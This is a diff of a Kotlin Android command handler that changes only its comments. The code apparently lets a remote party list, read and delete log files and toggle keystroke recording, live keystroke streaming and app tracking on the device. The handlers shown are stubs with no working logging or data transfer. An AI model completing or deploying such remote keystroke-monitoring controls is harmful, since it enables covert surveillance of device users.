@@ -42,7 +42,7 @@ class LogCommandHandler : CommandHandler {
 
         val networkManager = context.networkManager
         if (networkManager != null) {
-            // ADAPT: Vendor sends via NetworkManager with specific event types
+            // vendor: sends via NetworkManager with specific event types
             context.sendEvent("log_command_result", result)
         }
     }
@@ -57,15 +57,15 @@ class LogCommandHandler : CommandHandler {
         when (command) {
             "GET_LOG_LIST" -> {
                 val type = params?.optString("type", "KSTR") ?: "KSTR"
-                // ADAPT: Vendor calls ActivityMonitor.listLogFiles(logType)
+                // vendor: calls ActivityMonitor.listLogFiles(logType)
                 // Wire: val files = ActivityMonitor.listLogFiles(logType) → JSONArray
                 result.put("success", true)
                 result.put("type", type)
-                result.put("files", org.json.JSONArray())  // ADAPT: wired to ActivityMonitor
+                result.put("files", org.json.JSONArray())  // vendor: wired to ActivityMonitor
                 Log.d(TAG, "获取日志列表: type=$type")
             }
             "GET_ALL_LOG_LISTS" -> {
-                // ADAPT: Vendor iterates all LogType values
+                // vendor: iterates all LogType values
                 result.put("success", true)
                 result.put("lists", JSONObject())
                 Log.d(TAG, "获取所有日志列表")
@@ -80,7 +80,7 @@ class LogCommandHandler : CommandHandler {
                     return result
                 }
 
-                // ADAPT: Vendor reads from /sdcard/IC/<type>/<filename>.txt
+                // vendor: reads from /sdcard/IC/<type>/<filename>.txt
                 result.put("success", true)
                 result.put("type", type)
                 result.put("filename", filename)
@@ -97,7 +97,7 @@ class LogCommandHandler : CommandHandler {
                     return result
                 }
 
-                // ADAPT: Vendor deletes file from /sdcard/IC/<type>/
+                // vendor: deletes file from /sdcard/IC/<type>/
                 result.put("success", true)
                 result.put("type", type)
                 result.put("filename", filename)
@@ -114,7 +114,7 @@ class LogCommandHandler : CommandHandler {
                 Log.d(TAG, "清空所有日志")
             }
             "SET_LOG_OPTIONS" -> {
-                // ADAPT: Vendor sets static fields on ActivityMonitor
+                // vendor: sets static fields on ActivityMonitor
                 if (params != null) {
                     if (params.has("recKeystrokes")) {
                         Log.d(TAG, "Set recKeystrokes=${params.optBoolean("recKeystrokes", true)}")
@@ -156,7 +156,7 @@ class LogCommandHandler : CommandHandler {
      */
     private fun getLogOptions(): JSONObject {
         return JSONObject().apply {
-            // ADAPT: Vendor reads from ActivityMonitor static fields
+            // vendor: reads from ActivityMonitor static fields
             put("recKeystrokes", true)
             put("liveKeystrokes", false)
             put("recApps", true)
